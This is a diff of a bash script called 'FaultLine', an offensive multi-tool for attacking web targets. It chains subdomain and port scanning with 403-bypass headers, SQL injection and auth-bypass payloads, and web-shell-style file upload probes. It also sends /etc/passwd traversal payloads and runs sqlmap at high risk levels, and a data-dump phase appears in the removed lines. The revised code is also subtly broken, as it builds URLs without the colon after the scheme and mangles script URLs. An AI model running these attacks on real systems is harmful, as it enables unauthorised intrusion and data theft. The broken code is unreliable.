@@ -1,19 +1,18 @@
 #!/bin/bash
 
-
 # ======= COLORS =======
 RED="\033[1;31m"
 GREEN="\033[1;32m"
-CYAN="\033[1;96m"   #Cyan="\[\033[0;36m\]"
+CYAN="\033[1;36m"
 YELLOW="\033[1;33m"
 MAGENTA="\033[1;35m"
-WHITE="\e[1;97m"
-NC="\033[0m" # No Color
+WHITE="\033[1;37m"
+NC="\033[0m"  # No Color
 
 # ======= VARIABLES =======
 SAVE_MODE=0
 OUTPUT_DIR=""
-DEBUG=1 # Set to 0 to disable debugging
+DEBUG=0  # Set to 1 to enable debugging
 
 debug() {
     if [[ "$DEBUG" -eq 1 ]]; then
@@ -24,35 +23,37 @@ debug() {
 # ======= BANNER =======
 banner() {
     echo -e "${CYAN}"
-    echo "++----------------------------------------------------------------------------------++";
-    echo "++----------------------------------------------------------------------------------++";
-    echo "||                                                                                  ||";
-    echo "||                                                                                  ||";
-    echo "||   8888888888                888 888        888      d8b                   888    ||";
-    echo "||   888                       888 888        888      Y8P                   888    ||";
-    echo "||   888                       888 888        888                            888    ||";
-    echo "||   8888888  8888b.  888  888 888 888888     888      888 88888b.   .d88b.  888    ||";
-    echo "||   888          88b 888  888 888 888        888      888 888  88b d8P  Y8b 888    ||";
-    echo "||   888     .d888888 888  888 888 888        888      888 888  888 88888888 Y8P    ||";
-    echo "||   888     888  888 Y88b 888 888 Y88b.      888      888 888  888 Y8b.            ||";
-    echo "||   888      Y888888   Y88888 888   Y888     88888888 888 888  888   Y8888  888    ||";
-    echo "||                                                                                  ||";
-    echo "||                                                                                  ||";
-    echo "++----------------------------------------------------------------------------------++";
-    echo "++----------------------------------------------------------------------------------++'${NC}'";
-    echo -e "   ${WHITE}FaultLine: Red-Team Pentesting Suite\n${NC}"
-
-    echo -e "      ${YELLOW}Offensive Security Multi-Tool\n${NC}
-
-            ${MAGENTA}------------------------------------------------------------
-                Developer: Austin Tatham       Version: 1.0.0
-            ------------------------------------------------------------${NC}
- "
+    echo "++----------------------------------------------------------------------------------++"
+    echo "++----------------------------------------------------------------------------------++"
+    echo "||                                                                                  ||"
+    echo "||                                                                                  ||"
+    echo "|| 8888888888 888 888 888 d8b 888                                                   ||"
+    echo "|| 888        888 888 888 Y8P 888                                                   ||"
+    echo "|| 888        888 888 888     888                                                   ||"
+    echo "|| 8888888    8888b.  888 888 888888 888 888 88888b.  .d88b.  888                  ||"
+    echo "|| 888           88b 888 888 888     888 888 888 88b d8P  Y8b 888                  ||"
+    echo "|| 888      .d888888 888 888 888     888 888 888 888 88888888 Y8P                  ||"
+    echo "|| 888      888  888 Y88b888 Y88b.   Y88b888 888 888 Y8b.                          ||"
+    echo "|| 888      Y888888   Y88888  Y88888  Y88888 888 888  Y8888 888                    ||"
+    echo "||                                                                                  ||"
+    echo "||                                                                                  ||"
+    echo "++----------------------------------------------------------------------------------++"
+    echo "++----------------------------------------------------------------------------------++${NC}"
+    echo -e "${WHITE}FaultLine: Red-Team Pentesting Suite${NC}"
+    echo -e "${YELLOW}Offensive Security Multi-Tool${NC}"
+    echo -e "${MAGENTA}------------------------------------------------------------"
+    echo "    Developer: Austin Tatham | Version: 1.0.0"
+    echo -e "------------------------------------------------------------${NC}"
 }
 
 # ======= USAGE =======
 usage() {
     echo -e "${GREEN}Usage:${NC} $0 -t <target> -m <mode> [-s <output_dir>]"
+    echo -e "${YELLOW}Modes:${NC} recon, exploit, all"
+    echo -e "${YELLOW}Options:${NC}"
+    echo "  -t <target>     Target domain or IP (e.g., example.com)"
+    echo "  -m <mode>       Operation mode"
+    echo "  -s <output_dir> Enable saving and specify output directory"
     exit 1
 }
 
@@ -61,11 +62,19 @@ save_output() {
     local data="$1"
     local filename="$2"
     if [[ "$SAVE_MODE" -eq 1 ]]; then
+        mkdir -p "$OUTPUT_DIR"
         echo "$data" >> "$OUTPUT_DIR/$filename"
         echo -e "${GREEN}[+] Saved to $OUTPUT_DIR/$filename${NC}"
     fi
 }
 
+# Helper to check if a tool is installed
+check_tool() {
+    local tool="$1"
+    if ! command -v "$tool" &> /dev/null; then
+        echo -e "${RED}[-] Tool '$tool' not found. Some features may fail.${NC}"
+    fi
+}
 
 BYPASS_PAYLOADS=(
     "//admin//"
@@ -117,44 +126,46 @@ SQLI_PAYLOADS=(
     "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
 )
 
-
 crawl_html() {
-    echo -e "${CYAN}[+] Crawling HTML for sensitive data: $TARGET${NC}"
-    curl -s "https://$TARGET" | tee "$OUTPUT_DIR/full_html.txt"
+    local url="${PROTOCOL}//$TARGET"
+    echo -e "${CYAN}[+] Crawling HTML for sensitive data: $url${NC}"
+    local html_content=$(curl -s "$url")
+    save_output "$html_content" "full_html.txt"
 
     echo -e "${CYAN}[+] Extracting Comments...${NC}"
-    grep '<!--' "$OUTPUT_DIR/full_html.txt" >> "$OUTPUT_DIR/comments.txt"
+    echo "$html_content" | grep '<!--' | save_output "$(cat)" "comments.txt"
 
     echo -e "${CYAN}[+] Extracting Forms...${NC}"
-    grep -oP '<form.*?</form>' "$OUTPUT_DIR/full_html.txt" >> "$OUTPUT_DIR/forms.txt"
+    echo "$html_content" | grep -oP '<form.*?</form>' | save_output "$(cat)" "forms.txt"
 
     echo -e "${CYAN}[+] Searching for Hidden Inputs...${NC}"
-    grep -oP '<input type="hidden".*?>' "$OUTPUT_DIR/full_html.txt" >> "$OUTPUT_DIR/hidden_inputs.txt"
+    echo "$html_content" | grep -oP '<input type="hidden".*?>' | save_output "$(cat)" "hidden_inputs.txt"
 
     echo -e "${CYAN}[+] Extracting Metadata Tags...${NC}"
-    grep -oP '<meta.*?>' "$OUTPUT_DIR/full_html.txt" >> "$OUTPUT_DIR/meta_tags.txt"
+    echo "$html_content" | grep -oP '<meta.*?>' | save_output "$(cat)" "meta_tags.txt"
 
     echo -e "${CYAN}[+] Extracting JavaScript Files...${NC}"
-    grep -oP 'src=".*?\.js"' "$OUTPUT_DIR/full_html.txt" | cut -d'"' -f2 >> "$OUTPUT_DIR/js_files.txt"
+    echo "$html_content" | grep -oP 'src=".*?\.js"' | cut -d'"' -f2 | save_output "$(cat)" "js_files.txt"
 
     echo -e "${CYAN}[+] Extracting Links...${NC}"
-    grep -Eo '(http|https)://[a-zA-Z0-9./?=_-]*' "$OUTPUT_DIR/full_html.txt" | sort -u > "$OUTPUT_DIR/urls.txt"
-    #grep -oP 'href' "$OUTPUT_DIR/full_html.txt"  >> "$OUTPUT_DIR/href_links.txt"
+    echo "$html_content" | grep -Eo '(http|https)://[a-zA-Z0-9./?=_-]*' | sort -u | save_output "$(cat)" "urls.txt"
 
     echo -e "${GREEN}[+] HTML Crawler Complete.${NC}"
 }
 
 subdomain_enum() {
-    echo -e "\n\e[94m[+] Enumerating Subdomains (subfinder + assetfinder + crt.sh)...\e[0m"
-    subfinder -d "$TARGET" -silent > "$OUTPUT_DIR/subfinder.txt"
-    assetfinder --subs-only "$TARGET" >> "$OUTPUT_DIR/subfinder.txt"
-    curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> "$OUTPUT_DIR/subfinder.txt"
-    sort -u "$OUTPUT_DIR/subfinder.txt" > "$OUTPUT_DIR/subdomains.txt"
+    echo -e "${CYAN}[+] Enumerating Subdomains (subfinder + assetfinder + crt.sh)...${NC}"
+    local subs=""
+    subs+=$(subfinder -d "$TARGET" -silent 2>/dev/null)
+    subs+=$'\n'$(assetfinder --subs-only "$TARGET" 2>/dev/null)
+    subs+=$'\n'$(curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u)
+    echo "$subs" | sort -u | save_output "$(cat)" "subdomains.txt"
 }
 
 detect_cms() {
+    local url="${PROTOCOL}//$TARGET"
     echo -e "${CYAN}[+] Detecting CMS...${NC}"
-    response=$(curl -s "$TARGET")
+    local response=$(curl -s "$url")
     if echo "$response" | grep -iq "wp-content"; then
         echo -e "${GREEN}[+] WordPress detected.${NC}"
     elif echo "$response" | grep -iq "drupal"; then
@@ -167,57 +178,64 @@ detect_cms() {
 }
 
 bypass_403() {
-    echo "[+] Attempting 403 bypass on: $TARGET"
+    local url="${PROTOCOL}//$TARGET"
+    echo -e "${CYAN}[+] Attempting 403 bypass on: $url${NC}"
     for path in "${BYPASS_PAYLOADS[@]}"; do
         for header in "${BYPASS_HEADERS[@]}"; do
-            response=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "https://$TARGET$path")
-            if [[ "$response" == "200" ]]; then
-                echo "[+] Bypass Successful: https://$TARGET$path using Header: $header"
-                echo "$TARGET$path, Bypass, $header" >> "$OUTPUT_DIR/bypass_success.txt"
+            local response_code=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "$url$path")
+            if [[ "$response_code" == "200" ]]; then
+                echo -e "${GREEN}[+] Bypass Successful: $url$path using Header: $header${NC}"
+                save_output "$url$path, Bypass, $header" "bypass_success.txt"
             fi
         done
     done
 }
 
 grab_screenshot() {
-    echo -e "\n\e[94m[+] Taking Screenshots with GoWitness...\e[0m"
-    gowitness single http://$TARGET --destination "$OUTPUT_DIR"
-   # echo -e "\e[91m[-] GoWitness not found. Skipping screenshotting.\e[0m"
+    echo -e "${CYAN}[+] Taking Screenshots with GoWitness...${NC}"
+    if [[ "$SAVE_MODE" -eq 1 ]]; then
+        gowitness single "${PROTOCOL}//$TARGET" --destination "$OUTPUT_DIR" 2>/dev/null
+    else
+        gowitness single "${PROTOCOL}//$TARGET" 2>/dev/null
+    fi
 }
 
 Port_Scanning() {
     echo -e "${RED}[+] IMPORTANT!${NC}"
-    echo -e "${YELLOW}[+] About to begin ~Deep Crawl~ on $TARGET...5-10 min to complete ${NC}"
-    echo "[*] Scanning ports..."
-    nmap_results=$(sudo ./nmapAutomator.sh -H "$TARGET" -t Full)
+    echo -e "${YELLOW}[+] About to begin ~Deep Crawl~ on $TARGET... (5-10 min to complete)${NC}"
+    echo -e "${CYAN}[*] Scanning ports...${NC}"
+    local nmap_results=$(sudo nmapAutomator.sh -H "$TARGET" -t Full 2>/dev/null || echo "Nmap failed")
     echo -e "${GREEN}[+] Nmap Results:${NC}\n$nmap_results"
     save_output "$nmap_results" "nmap_$TARGET.txt"
 }
 
-misconfigurations_fuzz(){
-    echo -e "\n\e[94m[+] Checking for Open or Misconfigured Services (FTP/SMB/NFS)...\e[0m"
-    nmap --script ftp-anon,ftp-bounce,smb-enum-shares,smb-enum-users,nfs-showmount -p 21,139,445,2049 "$TARGET" -oN "$OUTPUT_DIR/service_scripts.txt"
+misconfigurations_fuzz() {
+    echo -e "${CYAN}[+] Checking for Open or Misconfigured Services (FTP/SMB/NFS)...${NC}"
+    nmap --script ftp-anon,ftp-bounce,smb-enum-shares,smb-enum-users,nfs-showmount -p 21,139,445,2049 "$TARGET" -oN - | save_output "$(cat)" "service_scripts.txt"
 }
 
 FinalRecon_call() {
-    echo "[*] Running FinalRecon..."
-    finalrecon_results=$(finalrecon --url "https://$TARGET" --dir -w /home/grep/custom_fuzz.txt)
+    echo -e "${CYAN}[*] Running FinalRecon...${NC}"
+    # Assume a default wordlist if custom not provided; replace with env var or param if needed
+    local wordlist="${WORDLIST:-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}"
+    local finalrecon_results=$(finalrecon --url "${PROTOCOL}//$TARGET" --dir -w "$wordlist" 2>/dev/null)
     echo -e "${GREEN}[+] FinalRecon Results:${NC}\n$finalrecon_results"
     save_output "$finalrecon_results" "finalrecon_$TARGET.txt"
 }
 
 parse_js_files() {
+    local url="${PROTOCOL}//$TARGET"
     echo -e "${CYAN}[+] Extracting JavaScript endpoints.${NC}"
-    js_files=$(curl -s "$TARGET" | grep -Eo 'src="[^"]+\.js"' | cut -d'"' -f2)
+    local html=$(curl -s "$url")
+    local js_files=$(echo "$html" | grep -Eo 'src="[^"]+\.js"' | cut -d'"' -f2)
     for js in $js_files; do
-        curl -s "$js" | grep -Eo 'http(s)?://[^"]+' >> "$OUTPUT_DIR/api_endpoints.txt"
+        curl -s "${js#http}" | grep -Eo 'http(s)?://[^"]+' | save_output "$(cat)" "api_endpoints.txt"
     done
 }
 
-
 test_file_upload() {
-    echo -e "${CYAN}[+] Testing for File Upload Vulnerabilities on: $TARGET${NC}"
-
+    local url="${PROTOCOL}//$TARGET"
+    echo -e "${CYAN}[+] Testing for File Upload Vulnerabilities on: $url${NC}"
     PAYLOAD_FILES=(
         "test.php"
         "test.jsp"
@@ -236,12 +254,12 @@ test_file_upload() {
     echo "MZ" > "test.exe"  # Fake EXE file
 
     UPLOAD_ENDPOINTS=(
-        "$TARGET/upload"
-        "$TARGET/file-upload"
-        "$TARGET/api/upload"
-        "$TARGET/admin/upload"
-        "$TARGET/media/upload"
-        "$TARGET/files/upload"
+        "/upload"
+        "/file-upload"
+        "/api/upload"
+        "/admin/upload"
+        "/media/upload"
+        "/files/upload"
     )
 
     UPLOAD_BYPASS_HEADERS=(
@@ -251,24 +269,21 @@ test_file_upload() {
     )
 
     SUCCESSFUL_UPLOADS=()
-
-    echo -e "[+] Scanning for vulnerable upload endpoints..."
-
+    echo -e "${CYAN}[+] Scanning for vulnerable upload endpoints...${NC}"
     for endpoint in "${UPLOAD_ENDPOINTS[@]}"; do
+        full_endpoint="$url$endpoint"
         for file in "${PAYLOAD_FILES[@]}"; do
             for header in "${UPLOAD_BYPASS_HEADERS[@]}"; do
-                response=$(curl -s -X POST -H "$header" -F "file=@$file" "$endpoint")
-
-                if echo "$response" | grep -q -e "success" -e "uploaded" -e "http"; then
-                    if [[ ! " ${SUCCESSFUL_UPLOADS[@]} " =~ " $endpoint " ]]; then
-                        echo -e "${RED}[!] File upload vulnerability found at $endpoint${NC}"
-                        SUCCESSFUL_UPLOADS+=("$endpoint")
+                response=$(curl -s -X POST -H "$header" -F "file=@$file" "$full_endpoint")
+                if echo "$response" | grep -iq -e "success" -e "uploaded" -e "http"; then
+                    if [[ ! " ${SUCCESSFUL_UPLOADS[*]} " =~ " $full_endpoint " ]]; then
+                        echo -e "${RED}[!] File upload vulnerability found at $full_endpoint${NC}"
+                        SUCCESSFUL_UPLOADS+=("$full_endpoint")
                     fi
-
-                    EXEC_PATHS=("$endpoint/$file" "$TARGET/uploads/$file" "$TARGET/media/$file")
+                    EXEC_PATHS=("$full_endpoint/$file" "$url/uploads/$file" "$url/media/$file")
                     for exec_path in "${EXEC_PATHS[@]}"; do
                         exec_response=$(curl -s "$exec_path")
-                        if echo "$exec_response" | grep -q "Vulnerable"; then
+                        if echo "$exec_response" | grep -iq "Vulnerable"; then
                             echo -e "${GREEN}[+] Executable file uploaded successfully: $exec_path${NC}"
                         fi
                     done
@@ -276,47 +291,47 @@ test_file_upload() {
             done
         done
     done
-
     echo -e "${GREEN}[+] File Upload Testing Complete.${NC}"
-
-    rm -f test.php test.jsp test.html test.jpg.php test.php5 test.php\;.jpg test.asp test.exe
+    rm -f "${PAYLOAD_FILES[@]}"  # Clean up
 }
 
 dns_brute() {
-    echo -e "\n\e[94m[+] Brute-forcing DNS...\e[0m"
-    dnsrecon -d "$TARGET" -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t brt > "$OUTPUT_DIR/dns_brute.txt"
+    echo -e "${CYAN}[+] Brute-forcing DNS...${NC}"
+    local wordlist="${DNS_WORDLIST:-/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt}"
+    dnsrecon -d "$TARGET" -D "$wordlist" -t brt 2>/dev/null | save_output "$(cat)" "dns_brute.txt"
 }
-
 
 fuzz_suite() {
-    echo -e "\e[96m[+] Launching Full-Stack Fuzzing Suite...\e[0m"
-    
-    echo -e "\n\e[94m[+] Fuzzing GET parameters for injection points...\e[0m"
-    ffuf -u "$TARGET?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 40 -mc all -of json -o "$OUTPUT_DIR/ffuf_params.json"
-    
-    echo -e "\n\e[94m[+] Running dirsearch...\e[0m"
-    dirsearch -u "$TARGET" -e php,html,js,txt -w /usr/share/seclists/Discovery/Web-Content/common.txt -o "$OUTPUT_DIR/dirsearch.txt"
-    
-    echo -e "\n\e[94m[+] Scanning for vulnerable network services...\e[0m"
-    nmap -p 161,500,1900,5353,111,2049 "$TARGET" -sV -oN "$OUTPUT_DIR/net_services.txt"
+    echo -e "${CYAN}[+] Launching Full-Stack Fuzzing Suite...${NC}"
+
+    echo -e "${CYAN}[+] Fuzzing GET parameters for injection points...${NC}"
+    local param_wordlist="${PARAM_WORDLIST:-/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt}"
+    ffuf -u "${PROTOCOL}//$TARGET?FUZZ=test" -w "$param_wordlist" -t 40 -mc all -of json -o - 2>/dev/null | save_output "$(cat)" "ffuf_params.json"
+
+    echo -e "${CYAN}[+] Running dirsearch...${NC}"
+    local dir_wordlist="${DIR_WORDLIST:-/usr/share/seclists/Discovery/Web-Content/common.txt}"
+    dirsearch -u "${PROTOCOL}//$TARGET" -e php,html,js,txt -w "$dir_wordlist" -o - 2>/dev/null | save_output "$(cat)" "dirsearch.txt"
+
+    echo -e "${CYAN}[+] Scanning for vulnerable network services...${NC}"
+    nmap -p 161,500,1900,5353,111,2049 "$TARGET" -sV -oN - 2>/dev/null | save_output "$(cat)" "net_services.txt"
 }
 
-
 sql_injection_test() {
-    echo -e "${CYAN}[+] Testing SQL injection vulnerabilities on: $TARGET${NC}"
+    local url="${PROTOCOL}//$TARGET"
+    echo -e "${CYAN}[+] Testing SQL injection vulnerabilities on: $url${NC}"
     PAYLOADS=("' OR '1'='1" "' AND SLEEP(5)--")
-    for PAYLOAD in "${PAYLOADS[@]}"; do
-        RESPONSE=$(curl -s "$TARGET?id=$PAYLOAD")
-        if [[ $RESPONSE =~ "error" || $RESPONSE =~ "syntax" ]]; then
-            echo -e "${GREEN}[!] SQL Injection vulnerability detected: $PAYLOAD${NC}"
+    for payload in "${PAYLOADS[@]}"; do
+        response=$(curl -s "$url?id=$payload")
+        if [[ $response =~ "error" || $response =~ "syntax" ]]; then
+            echo -e "${GREEN}[!] SQL Injection vulnerability detected: $payload${NC}"
         fi
     done
 }
 
 test_directory_traversal() {
-    echo -e "${CYAN}[+] Testing for Advanced Directory Traversal Vulnerabilities on: $TARGET${NC}"
-    OUTPUT_FILE="results/traversal_vulns.txt"
-    mkdir -p results
+    local url="${PROTOCOL}//$TARGET"
+    echo -e "${CYAN}[+] Testing for Advanced Directory Traversal Vulnerabilities on: $url${NC}"
+    local output_file="$OUTPUT_DIR/traversal_vulns.txt" if [[ $SAVE_MODE -eq 1 ]]; then touch "$output_file"; fi
 
     PAYLOADS=(
         "../../../../etc/passwd"
@@ -350,7 +365,6 @@ test_directory_traversal() {
     )
 
     REQUEST_METHODS=("GET" "POST" "HEAD")
-
     USER_AGENTS=(
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
@@ -369,115 +383,93 @@ test_directory_traversal() {
         "Forwarded: 127.0.0.1"
     )
 
-   SUCCESSFUL_TRAVERSAL=()
-
-    echo -e "[+] Scanning for directory traversal vulnerabilities..."
-
+    SUCCESSFUL_TRAVERSAL=()
+    echo -e "${CYAN}[+] Scanning for directory traversal vulnerabilities...${NC}"
     for method in "${REQUEST_METHODS[@]}"; do
         for user_agent in "${USER_AGENTS[@]}"; do
             for header in "${HEADERS[@]}"; do
                 for payload in "${PAYLOADS[@]}"; do
-                    response=$(curl -s -X "$method" -H "User-Agent: $user_agent" -H "$header" "$TARGET/$payload")
-
-                    if echo "$response" | grep -q -e "root:x" -e "127.0.0.1" -e "windows registry" -e "root:x:0" -e "[boot loader]" -e "mysql_user" -e "apache2.conf" -e "nginx.conf"; then
-                        if [[ ! " ${SUCCESSFUL_TRAVERSAL[@]} " =~ " $TARGET/$payload " ]]; then
-                            echo -e "${RED}[!] Directory Traversal Vulnerability Found at: $TARGET${NC}"
-                            SUCCESSFUL_TRAVERSAL+=("$TARGET/$payload")
-                            echo "$TARGET, Traversal, $payload" >> "$OUTPUT_FILE"
+                    response=$(curl -s -X "$method" -H "User-Agent: $user_agent" -H "$header" "$url/$payload")
+                    if echo "$response" | grep -iq -e "root:x" -e "127.0.0.1" -e "windows registry" -e "root:x:0" -e "[boot loader]" -e "mysql_user" -e "apache2.conf" -e "nginx.conf"; then
+                        if [[ ! " ${SUCCESSFUL_TRAVERSAL[*]} " =~ " $url/$payload " ]]; then
+                            echo -e "${RED}[!] Directory Traversal Vulnerability Found at: $url/$payload${NC}"
+                            SUCCESSFUL_TRAVERSAL+=("$url/$payload")
+                            if [[ $SAVE_MODE -eq 1 ]]; then echo "$url, Traversal, $payload" >> "$output_file"; fi
                         fi
                     fi
                 done
             done
         done
     done
-
-    echo -e "${GREEN}[+] Directory Traversal Testing Complete. Results saved in $OUTPUT_FILE${NC}"
+    echo -e "${GREEN}[+] Directory Traversal Testing Complete.${NC}"
+    if [[ $SAVE_MODE -eq 1 ]]; then echo -e "${GREEN}Results saved in $output_file${NC}"; fi
 }
 
-
 test_sqli() {
-    echo "[+] Testing SQL Injection on $TARGET"
+    local url="${PROTOCOL}//$TARGET"
+    echo -e "${CYAN}[+] Testing SQL Injection on $url${NC}"
     for payload in "${SQLI_PAYLOADS[@]}"; do
-        response=$(curl -s "https://$TARGET/login?user=$payload")
-        if echo "$response" | grep -q -e "error" -e "admin"; then
-            echo "[!] SQLi Found: https://$TARGET/login?user=$payload"
-            echo "$TARGET, SQLi, $payload" >> "$OUTPUT_DIR/sqli_vulns.txt"
+        response=$(curl -s "$url/login?user=$payload")
+        if echo "$response" | grep -iq -e "error" -e "admin"; then
+            echo -e "${GREEN}[!] SQLi Found: $url/login?user=$payload${NC}"
+            save_output "$url, SQLi, $payload" "sqli_vulns.txt"
         fi
     done
 }
 
-#temp_sqlmap() {
-#    echo -e "Start of Testing of SQLmap"
-#    dirtyresponse=$(sqlmap -u "https://$TARGET" --delay=2 --batch --level=5 --risk=3 --crawl=3 --fingerprint --random-agent -o "$OUTPUT_DIR/sqlmap.txt")
-#}
 temp_sqlmap() {
-    echo -e "\n[+] Starting SQL Injection Recon on https://$TARGET"
-    
+    local url="${PROTOCOL}//$TARGET"
+    echo -e "${CYAN}[+] Starting SQL Injection Recon on $url${NC}"
+
     TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-    SQLMAP_BASE="$OUTPUT_DIR/sqlmap_$TIMESTAMP"
-    mkdir -p "$SQLMAP_BASE"
-    LOGFILE="$SQLMAP_BASE/full_report.log"
-    URL="https://$TARGET"
+    SQLMAP_BASE="$OUTPUT_DIR/sqlmap_$TIMESTAMP" if [[ $SAVE_MODE -eq 1 ]]; then mkdir -p "$SQLMAP_BASE"; fi
+    LOGFILE="$SQLMAP_BASE/full_report.log" if [[ $SAVE_MODE -eq 1 ]]; then touch "$LOGFILE"; fi
 
-    echo -e "\n[*] Phase 1: Fingerprinting & Crawling" | tee -a "$LOGFILE"
-    sqlmap -u "$URL" --batch --level=5 --risk=3 --crawl=3 --random-agent --technique=BEUSTQ \
-        --threads=4 --delay=1 --timeout=15 --retries=2 --output-dir="$SQLMAP_BASE" \
+    echo -e "${CYAN}[*] Phase 1: Fingerprinting & Crawling${NC}" | tee -a "$LOGFILE"
+    sqlmap -u "$url" --batch --level=5 --risk=3 --crawl=3 --random-agent --technique=BEUSTQ \
+        --threads=4 --delay=1 --timeout=15 --retries=2 \
         --flush-session --answers="follow=Y" --smart \
-        --fingerprint \
-        | tee -a "$LOGFILE"
+        --fingerprint | tee -a "$LOGFILE"
 
-    echo -e "\n[*] Phase 2: Parameter Discovery & Testing" | tee -a "$LOGFILE"
-    sqlmap -u "$URL" --batch --level=5 --risk=3 --random-agent --technique=BEUSTQ \
+    echo -e "${CYAN}[*] Phase 2: Parameter Discovery & Testing${NC}" | tee -a "$LOGFILE"
+    sqlmap -u "$url" --batch --level=5 --risk=3 --random-agent --technique=BEUSTQ \
         --forms --crawl=3 --crawl-exclude="logout" \
         --threads=5 --delay=1 \
-        --output-dir="$SQLMAP_BASE" \
         --flush-session \
-        --identify-waf \
-        | tee -a "$LOGFILE"
+        --identify-waf | tee -a "$LOGFILE"
 
-    echo -e "\n[*] Phase 3: Database Enumeration" | tee -a "$LOGFILE"
-    sqlmap -u "$URL" --batch --random-agent --technique=BEUSTQ \
+    echo -e "${CYAN}[*] Phase 3: Database Enumeration${NC}" | tee -a "$LOGFILE"
+    sqlmap -u "$url" --batch --random-agent --technique=BEUSTQ \
         --threads=3 --delay=1 \
-        --output-dir="$SQLMAP_BASE" \
         --dbs | tee -a "$LOGFILE"
 
-    echo -e "\n[*] Phase 4: Table & Column Enumeration (If DB found)" | tee -a "$LOGFILE"
-    # This can be looped through discovered DBs
-    sqlmap -u "$URL" --batch --random-agent --technique=BEUSTQ \
-        --output-dir="$SQLMAP_BASE" \
-        -D TARGET_DB --tables | tee -a "$LOGFILE"
+    # For phases 4-5, in practice you'd parse DBs from logs; here skip or manual
+    echo -e "${YELLOW}[-] Phases 4-5 skipped: Manually specify DB/table from logs.${NC}" | tee -a "$LOGFILE"
 
-    sqlmap -u "$URL" --batch --random-agent --technique=BEUSTQ \
-        --output-dir="$SQLMAP_BASE" \
-        -D TARGET_DB -T TARGET_TABLE --columns | tee -a "$LOGFILE"
-
-    echo -e "\n[*] Phase 5: Optional Data Dump (Caution!)" | tee -a "$LOGFILE"
-    sqlmap -u "$URL" --batch --random-agent --technique=BEUSTQ \
-        --output-dir="$SQLMAP_BASE" \
-        -D TARGET_DB -T TARGET_TABLE -C COLUMN1,COLUMN2 --dump | tee -a "$LOGFILE"
-
-    echo -e "\n[+] SQLmap Testing Completed! Logs saved in $SQLMAP_BASE"
-    }
-
+    echo -e "${GREEN}[+] SQLmap Testing Completed!${NC}"
+    if [[ $SAVE_MODE -eq 1 ]]; then echo -e "${GREEN}Logs saved in $SQLMAP_BASE${NC}"; fi
+}
 
 detect_waf() {
+    local url="${PROTOCOL}//$TARGET"
     echo -e "${CYAN}[+] Detecting WAF...${NC}"
-    payload="' AND 1=1 --"
-    response=$(curl -s -d "param=$payload" "$TARGET" -o /dev/null -w "%{http_code}")
-    if [[ $response == "403" || $response == "406" ]]; then
-        echo -e "${RED}[!] WAF detected: Response code $response.${NC}"
+    local payload="' AND 1=1 --"
+    local response_code=$(curl -s -d "param=$payload" "$url" -o /dev/null -w "%{http_code}")
+    if [[ $response_code == "403" || $response_code == "406" ]]; then
+        echo -e "${RED}[!] WAF detected: Response code $response_code.${NC}"
     else
         echo -e "${GREEN}[+] No WAF detected.${NC}"
     fi
 }
 
 test_http_methods() {
+    local url="${PROTOCOL}//$TARGET"
     echo -e "${CYAN}[+] Testing HTTP Methods...${NC}"
     methods=("GET" "POST" "PUT" "DELETE" "OPTIONS" "HEAD" "TRACE")
     for method in "${methods[@]}"; do
-        response=$(curl -s -X "$method" "$TARGET" -w "%{http_code}")
-        echo -e "${YELLOW}[*] $method returned status code: $response${NC}"
-        if [[ $method == "TRACE" && $response == "200" ]]; then
+        response_code=$(curl -s -X "$method" "$url" -w "%{http_code}" -o /dev/null)
+        echo -e "${YELLOW}[*] $method returned status code: $response_code${NC}"
+        if [[ $method == "TRACE" && $response_code == "200" ]]; then
             echo -e "${RED}[!] TRACE method enabled. Possible XST vulnerability!${NC}"
         fi
     done
@@ -533,20 +525,58 @@ main() {
             sql_injection_test
             temp_sqlmap
             ;;
+        *)
+            usage
+            ;;
     esac
     echo -e "${GREEN}[+] FaultLine execution completed.${NC}"
-
 }
 
+# Enable error handling
+set -euo pipefail
+
+# Check dependencies
+check_tool "curl"
+check_tool "grep"
+check_tool "subfinder"
+check_tool "assetfinder"
+check_tool "jq"
+check_tool "gowitness"
+check_tool "nmap"
+check_tool "dnsrecon"
+check_tool "ffuf"
+check_tool "dirsearch"
+check_tool "sqlmap"
+# Add more as needed
+
+# Parse arguments
 while [[ $# -gt 0 ]]; do
     case "$1" in
         -t) TARGET="$2"; shift ;;
         -m) MODE="$2"; shift ;;
-        -jwt) JWT_TOKEN="$2"; shift ;;  # Accepting JWT for token testing
-        -s) SAVE_MODE=1; OUTPUT_DIR="$2"; mkdir -p "$OUTPUT_DIR"; shift ;;
+        #-jwt) JWT_TOKEN="$2"; shift ;;  # Unused, commented
+        -s) SAVE_MODE=1; OUTPUT_DIR="$2"; shift ;;
         *) usage ;;
     esac
     shift
 done
+
+# Validate required args
+if [[ -z "${TARGET:-}" || -z "${MODE:-}" ]]; then
+    usage
+fi
+
+# Default to HTTPS, but check if HTTP
+PROTOCOL="https"
+if ! curl -s -I "https://$TARGET" &> /dev/null; then
+    PROTOCOL="http"
+    echo -e "${YELLOW}[-] Falling back to HTTP for $TARGET.${NC}"
+fi
+
+if [[ "$SAVE_MODE" -eq 1 && -z "$OUTPUT_DIR" ]]; then
+    OUTPUT_DIR="./output_$(date +%Y%m%d_%H%M%S)"
+    echo -e "${YELLOW}[+] Output directory not specified; using $OUTPUT_DIR${NC}"
+fi
+mkdir -p "$OUTPUT_DIR" || true
 
 main
